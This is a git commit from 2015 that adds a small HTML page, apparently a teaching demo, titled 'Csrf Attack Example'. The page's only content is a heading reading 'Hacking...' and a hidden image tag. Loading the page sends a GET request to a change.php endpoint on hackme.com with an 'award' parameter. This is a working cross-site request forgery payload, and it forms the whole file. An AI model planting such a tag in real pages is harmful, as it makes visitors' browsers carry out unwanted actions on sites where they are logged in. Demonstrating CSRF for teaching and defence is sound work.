a38e444feaf04229d21acbc7391e1e32c4c35a54
DinoLai <dinos80152@gmail.com>
2015-07-10 15:51:25 +0800

    add csrf example

---
+++ csrf/index.php
@@ -0,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Csrf Attack Example</title>
+</head>
+<body>
+    <h1>Hacking...</h1>
+    <img src="http://hackme.com/csrf/change.php?award=1">
+</body>
+</html>
